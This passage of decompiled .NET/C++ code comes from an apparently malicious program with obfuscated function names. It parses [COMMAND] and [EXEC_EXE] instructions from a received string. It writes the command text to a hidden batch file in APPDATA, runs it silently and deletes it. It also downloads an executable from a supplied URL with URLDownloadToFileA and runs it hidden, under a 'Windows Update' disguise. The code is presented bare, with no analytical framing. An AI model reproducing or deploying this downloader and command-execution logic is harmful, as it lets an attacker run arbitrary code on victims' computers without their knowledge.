            int num2 = (IntPtr) \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (^(int&) ref stdCharTraitsChar1 + 4) + (IntPtr) &stdCharTraitsChar1)) == IntPtr.Zero ? 1 : 0;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(sbyte&) ((IntPtr) &_First + 4) = (sbyte) (byte) num2;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D\u003Cclass\u0020std\u003A\u003Aistreambuf_iterator\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u0020\u003E(obj0, _First, _Last);
            num1 = 1U;
            \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(&stdCharTraitsChar1);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdCharTraitsChar1);
          }
          \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdCharTraitsChar1);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
      return obj0;
    }
    __fault
    {
      if (((int) num1 & 1) != 0)
      {
        uint num3 = num1 & 4294967294U;
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) obj0);
      }
    }
  }

  internal static unsafe void xyikkDXVErb()
  {
    string s1 = (string) null;
    bool flag1 = false;
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
    \u003CModule\u003E.eMlAjryx(&stdAllocatorChar1);
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.remove((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_09OBIFGHAI\u0040\u003F4\u003F1tmp\u003F4err\u003F\u0024AA\u0040);
      string input = new string(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar1));
      foreach (Match match in new Regex("\\[ID\\](.*)?\\[\\/ID\\]", RegexOptions.IgnoreCase | RegexOptions.Multiline).Matches(input))
      {
        string s2 = match.Groups[1].Value;
        if (!(s2 == ""))
        {
          sbyte* _Val = \u003CModule\u003E.xytREyYpBfTDh(s2);
          basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar2, 3, 1);
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar2 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01KICIPPFI\u0040\u003F2\u003F\u0024AA\u0040), _Val);
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* dirName_in = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar2, &stdAllocatorChar3);
            bool flag2;
            // ISSUE: fault handler
            try
            {
              flag2 = !\u003CModule\u003E.llNOzMjObj(dirName_in);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
            if (flag2)
            {
              basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E stdCharTraitsChar;
              \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdCharTraitsChar, 1);
              // ISSUE: fault handler
              try
              {
                basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4;
                basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar2, &stdAllocatorChar4);
                // ISSUE: fault handler
                try
                {
                  \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eopen(&stdCharTraitsChar, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr), 2, 64);
                }
                __fault
                {
                  // ISSUE: method pointer
                  // ISSUE: cast to a function pointer type
                  \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar4);
                }
                \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar4);
                \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) &stdCharTraitsChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0P\u0040PJAKFCMN\u0040Windows\u003F5Update\u003F\u0024AA\u0040);
                \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(&stdCharTraitsChar);
                flag1 = true;
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdCharTraitsChar);
              }
              \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdCharTraitsChar);
            }
            else
              goto label_18;
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar2);
          }
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar2);
          break;
label_18:
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar2);
        }
      }
      if (flag1)
      {
        foreach (Match match in new Regex("\\[COMMAND\\](.*)?\\[\\/COMMAND\\]", RegexOptions.IgnoreCase | RegexOptions.Singleline).Matches(input))
        {
          s1 = match.Groups[1].Value;
          if (!(s1 == ""))
            break;
        }
        if (s1 != "")
        {
          sbyte* pointer = (sbyte*) Marshal.StringToHGlobalAnsi(s1).ToPointer();
          basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar5;
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar5, 3, 1);
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar5 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BD\u0040BPJMNAPG\u0040\u003F24564567453432\u003F4bat\u003F\u0024AA\u0040);
            basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E stdCharTraitsChar;
            \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdCharTraitsChar, 1);
            // ISSUE: fault handler
            try
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar6;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr1 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar5, &stdAllocatorChar6);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eopen(&stdCharTraitsChar, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr1), 2, 64);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar6);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar6);
              \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) &stdCharTraitsChar, pointer);
              \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(&stdCharTraitsChar);
              Process process = new Process();
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar7;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr2 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar5, &stdAllocatorChar7);
              // ISSUE: fault handler
              try
              {
                process.StartInfo.FileName = new string(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr2));
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar7);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar7);
              process.StartInfo.Arguments = "";
              process.StartInfo.UseShellExecute = false;
              process.StartInfo.CreateNoWindow = true;
              process.StartInfo.RedirectStandardOutput = true;
              process.StartInfo.RedirectStandardError = true;
              process.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(850);
              process.Start();
              do
                ;
              while (process.StandardOutput.ReadLine() != null);
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar8;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr3 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar5, &stdAllocatorChar8);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.remove(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr3));
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdCharTraitsChar);
            }
            \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdCharTraitsChar);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar5);
          }
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar5);
        }
        string s3 = "";
        foreach (Match match in new Regex("\\[EXEC_EXE\\](.*)?\\[\\/EXEC_EXE\\]", RegexOptions.IgnoreCase | RegexOptions.Singleline).Matches(input))
        {
          s3 = match.Groups[1].Value;
          if (!(s3 == ""))
            break;
        }
        if (s3 != "")
        {
          char* chPtr = (char*) \u003CModule\u003E.new\u005B\u005D(8192U);
          \u003CModule\u003E.MultiByteToWideChar(0U, 0U, \u003CModule\u003E.xytREyYpBfTDh(s3), -1, chPtr, 4096);
          basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar9;
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar9, 3, 1);
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar9 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BE\u0040CFJGHNOO\u0040\u003F2win32_35465465\u003F4exe\u003F\u0024AA\u0040);
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar10;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr4 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar9, &stdAllocatorChar10);
            // ISSUE: fault handler
            try
            {
              \u003CModule\u003E.remove(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr4));
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar10);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar10);
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar11;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr5 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar9, &stdAllocatorChar11);
            // ISSUE: fault handler
            try
            {
              \u003CModule\u003E.URLDownloadToFileA((IUnknown*) 0, \u003CModule\u003E.xytREyYpBfTDh(s3), \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr5), 0U, (IBindStatusCallback*) 0);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar11);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar11);
            Process process = new Process();
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar12;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr6 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar9, &stdAllocatorChar12);
            // ISSUE: fault handler
            try
            {
              process.StartInfo.FileName = new string(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr6));
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar12);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar12);
            process.StartInfo.Arguments = "";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(850);
            process.Start();
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar9);
          }
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar9);
        }
      }
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
    }
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool pWNqRmwPzwupZ(
